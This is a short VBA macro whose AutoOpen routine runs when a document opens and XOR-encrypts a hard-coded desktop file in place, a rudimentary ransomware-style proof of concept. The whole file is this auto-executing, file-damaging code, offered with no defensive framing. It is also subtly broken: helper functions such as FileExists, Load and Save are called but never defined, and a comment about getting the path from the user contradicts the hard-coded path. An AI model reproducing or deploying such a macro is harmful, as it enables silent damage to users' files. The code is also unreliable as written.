Sub AutoOpen()
    ' Get the file path from the user
    Dim FilePath As String
    FilePath="C:\Users\Administrators\Desktop\test.txt"

    ' Check if the file exists
    If FileExists(FilePath) Then
        ' File found
        MsgBox "Found"

        ' Encrypt the file (basic XOR encryption)
        EncryptFile FilePath

        MsgBox "File encrypted successfully!"
    Else
        ' File not found
        MsgBox "Not Found"
    End If
End Sub

Sub EncryptFile(FilePath As String)
    ' Basic XOR encryption key (you can modify this key)
    Dim encryptionKey As Integer
    encryptionKey = 42

    ' Read the content of the file
    Dim fileContent As String
    Dim fileNumber As Integer
    fileNumber = FreeFile   ' Obtain a free file number
    fileContent = Load(FilePath)

    ' Perform XOR encryption on each character
    Dim encryptedContent As String
    Dim i As Integer
    For i = 1 To Len(fileContent)
        encryptedContent = encryptedContent & Chr(Asc(Mid(fileContent, i, 1)) Xor encryptionKey)
    Next i

    ' Write the encrypted content back to the file
    Save encryptedContent, FilePath
End Sub
